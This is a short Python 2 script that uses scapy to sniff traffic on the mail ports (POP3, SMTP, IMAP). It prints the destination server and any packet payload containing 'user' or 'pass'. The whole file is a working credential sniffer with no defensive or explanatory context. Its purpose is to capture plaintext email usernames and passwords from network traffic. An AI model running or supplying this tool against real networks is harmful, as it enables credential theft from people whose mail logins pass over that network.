# coding=utf-8

from scapy.all import sniff, TCP, IP


def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        print "[*] Server: {}".format(packet[IP].dst)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print "[*] {}".format(packet[TCP].payload)


sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
      prn=packet_callback, store=0)
